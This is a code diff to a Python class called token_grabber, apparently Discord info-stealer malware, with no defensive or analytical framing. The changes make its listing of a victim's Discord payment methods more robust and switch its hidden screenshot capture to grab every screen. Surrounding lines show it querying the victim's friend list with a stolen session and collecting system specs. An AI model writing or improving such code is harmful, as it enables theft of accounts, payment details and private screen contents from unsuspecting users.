@@ -123,13 +123,16 @@ class token_grabber():
             else:
                 methods = ""
                 for method in b.json():
-                    if method['type'] == 1:
-                        methods += "💳"
-                    elif method['type'] == 0:
-                        methods += "<:paypal:973417655627288666>"
-                    else:
+                    try:
+                        if method['type'] == 1:
+                            methods += "💳"
+                        elif method['type'] == 0:
+                            methods += "<:paypal:973417655627288666>"
+                        else:
+                            methods += "❓"
+                    except TypeError:
                         methods += "❓"
-
+                        
             f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                 'Content-Type': 'application/json',
@@ -492,7 +495,7 @@ RAM: {round(systemspec.system_specs()[2], 0)} GB
 
 def image():
     os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
-    ImageGrab.grab().save('.\\screenshot.png', 'PNG')
+    ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save('.\\screenshot.png', 'PNG')
     hide('screenshot.png')
     
 def hide(file):
